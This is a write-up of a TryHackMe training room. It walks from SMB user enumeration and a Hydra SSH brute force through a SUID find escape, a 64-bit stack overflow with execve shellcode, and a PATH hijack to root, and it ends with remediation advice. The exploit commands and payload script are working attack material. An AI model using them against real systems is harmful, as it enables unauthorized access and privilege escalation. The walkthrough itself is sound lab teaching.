# TryHackMe: Binex — Chaining Three SUID Binaries to Root

*A walkthrough of the "Binex" room (Penetration Tester, Level Mid). We go from an
anonymous SMB session all the way to root by hopping through three different
users, each unlocked by abusing a different SUID binary: a GTFOBins classic, a
64-bit stack buffer overflow, and a PATH hijack.*

> Flag values are redacted. This is a retired training box on TryHackMe; nothing
> here is aimed at any system without authorization.

---

## TL;DR

1. **Recon** — SSH and Samba are open.
2. **Enumeration** — an SMB null session leaks four local users via RID cycling.
3. **Foothold** — the user with the longest name (`tryhackme`) has a weak SSH
   password; Hydra finds it.
4. **des** — a SUID `find` owned by `des` gives us their identity (GTFOBins).
5. **kel** — a 64-bit stack buffer overflow in a SUID binary owned by `kel`.
6. **root** — a SUID-root binary calls `ps` by name, so we hijack `PATH`.

The theme of the whole box: **a SUID binary owned by another user is a
lateral-movement primitive, not just a root one.**

---

## 1. Recon

As always, start with a full port scan:

```bash
export IP=<target-ip>
nmap -sC -sV -p- -T4 --min-rate=1000 $IP
```

```
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu
```

Three ports: SSH and a Samba server. The host calls itself `THM_EXPLOIT`, SMB
message signing is disabled, and a guest/NULL session is allowed. With no web
service in sight, SMB is where the enumeration begins.

## 2. Enumeration: finding users over SMB

First, list the shares — just in case something is readable:

```bash
smbclient -L $IP -U anonymous
```

Only `print$` and `IPC$`, both `NO ACCESS`. No files to loot. But Samba will
still hand us a **user list** even from a null session, through RID cycling:

```bash
enum4linux -r $IP
```

```
S-1-22-1-1000 Unix User\kel
S-1-22-1-1001 Unix User\des
S-1-22-1-1002 Unix User\tryhackme
S-1-22-1-1003 Unix User\noentry
```

Four local users: `kel`, `des`, `tryhackme`, `noentry`. The room hint tells us
the foothold user is the one with the **longest name** — that is `tryhackme`.

## 3. Foothold: brute-forcing SSH

We have a username and a service that takes passwords. Time for Hydra and
`rockyou.txt`:

```bash
hydra -l tryhackme -P /usr/share/wordlists/rockyou.txt ssh://$IP -I -T 6
```

```
[22][ssh] host: <target-ip>   login: tryhackme   password: thebest
```

```bash
ssh tryhackme@$IP        # password: thebest
```

We land a shell as `tryhackme` on Ubuntu 18.04. Now the real fun — the privesc
chain — begins.

## 4. From tryhackme to des: a SUID `find`

We cannot just walk into `/home/des`:

```
tryhackme@THM_exploit:/home$ cd des/
-bash: cd: des/: Permission denied
```

But a **SUID binary owned by `des`** runs *as* `des`, regardless of who launches
it. Let's hunt specifically for SUID files owned by that user:

```bash
find / -type f -perm -04000 -user des -exec ls -ldb {} \; 2>/dev/null
```

```
-rwsr-sr-x 1 des des 238080 /usr/bin/find
```

`find` itself is SUID `des`. And `find` is a well-known
[GTFOBins](https://gtfobins.github.io/gtfobins/find/) entry — its `-exec` option
runs any command with the binary's privileges:

```bash
/usr/bin/find . -exec /bin/bash -p \; -quit
```

```
bash-4.4$ id
uid=1002(tryhackme) ... euid=1001(des) egid=1001(des) groups=1001(des),1002(tryhackme)
```

Our **effective UID is now `des`**. The `-p` flag matters: it stops Bash from
dropping the elevated privileges on startup. With `euid=des`, `/home/des` opens
up:

```bash
cd /home/des && cat flag.txt
```

The flag congratulates us on the SUID exploit (value redacted) and, helpfully,
leaves behind `des`'s login credentials. In that same directory sit two files
that set up the next stage: `bof` (a SUID binary owned by **kel**) and its C
source, `bof64.c`.

## 5. From des to kel: a 64-bit stack buffer overflow

`/home/des/bof` reads a string into a fixed-size stack buffer with no bounds
checking. That is a textbook stack overflow. Two things make exploitation easy on
this box: **ASLR is effectively disabled** (stack addresses are stable between
runs) and the stack is executable.

### Step 1 — confirm we control the instruction pointer

```bash
gdb ./bof
(gdb) r < <(python -c 'print("A" * 700)')
```

```
Program received signal SIGSEGV, Segmentation fault.
rbp  0x4141414141414141
```

Our `A`s (0x41) have overwritten saved registers. We control the crash.

### Step 2 — find the exact offset

Generate a cyclic pattern, feed it in, and look up where it landed:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000
# crash the program with that pattern, read the overwritten value, then:
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 1000 -q 4134754133754132
# [*] Exact match at offset 608
```

Saved RBP sits at offset **608**, so the return address (RIP) follows at 616.

### Step 3 — build the payload

Strategy: land the CPU inside a big **NOP sled** that slides down into
`execve("/bin//sh")` shellcode, all placed on the stack. Because ASLR is off, we
can hardcode a stack address that points into the sled.

```python
from struct import pack

# execve("/bin//sh") shellcode
buf  = "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

payload  = "\x90" * 400               # NOP sled
payload += buf                        # shellcode
payload += "A" * (208 - len(buf))     # pad up to saved RBP (offset 608)
payload += "B" * 8                    # overwrite saved RBP
payload += pack("<Q", 0x7fffffffe300) # RIP -> somewhere inside the NOP sled
print(payload)
```

### Step 4 — fire it and keep the shell alive

The binary reads from stdin, so we pipe the payload in — and then keep stdin open
with a trailing `cat` so our interactive shell does not die immediately:

```bash
python bo.py > test
(cat test; cat) | ./bof
```

```
id
uid=1000(kel) gid=1001(des) groups=1001(des)
```

We are `kel`. Upgrade to a proper TTY and read the loot:

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
cd /home/kel && cat flag.txt
```

Flag two (redacted) confirms the buffer overflow, and again the flag file leaves
`kel`'s credentials. This directory holds the final target: `exe`, a
**SUID-root** binary, and its source `exe.c`.

## 6. From kel to root: a PATH hijack

Reading the source of the SUID-root binary is what breaks the box wide open:

```c
#include <unistd.h>

void main() {
    setuid(0);
    setgid(0);
    system("ps");   // "ps" is called by NAME, not full path
}
```

It runs as root (`setuid(0)`), then calls `system("ps")`. Crucially, `ps` is
resolved through `$PATH` — so if *we* control which `ps` runs first, root runs
*our* program.

```bash
cp /bin/bash /tmp/ps          # our malicious "ps" is just a shell
export PATH=/tmp:$PATH        # put /tmp at the front of PATH
cd /home/kel && ./exe
```

```
root@THM_exploit:/home/kel# id
uid=0(root) ...
cat /root/root.txt
```

Root shell, final flag (redacted). Done.

---

## Remediation

For each link in this chain, the fix is small and worth stating in a report:

- **SUID `find`** — never set the SUID bit on general-purpose binaries. As the
  in-game flag itself says: *"Never assign +s to any system executable files.
  Remember, check GTFOBins."*
- **Buffer overflow** — compile with stack canaries, NX, and PIE; enable ASLR;
  and do not ship SUID binaries that read unbounded input.
- **PATH hijack** — in privileged programs, call external tools by **absolute
  path** (`/bin/ps`) and sanitise the environment; better yet, avoid `system()`
  entirely.

## Takeaways

- **RID cycling** (`enum4linux -r`) pulls a username list out of Samba even from
  a null session — do it before you brute-force anything blind.
- **SUID chaining**: a SUID binary owned by *another user* moves you sideways to
  that user. Enumerate SUID files per-owner, not just per-root.
- For a **basic stack overflow** with ASLR/NX off: crash it, get the offset with
  `pattern_offset.rb`, then a NOP sled plus a hardcoded stack return address is
  all you need. Keep the shell alive with `(cat payload; cat) | ./binary`.
- Always **read the source** of a SUID binary when you can — a single relative
  command name (`system("ps")`) is game over.

Thanks for reading. The room was built by DesKel — a genuinely fun chain that
rewards understanding *why* each primitive works rather than just running a
script.
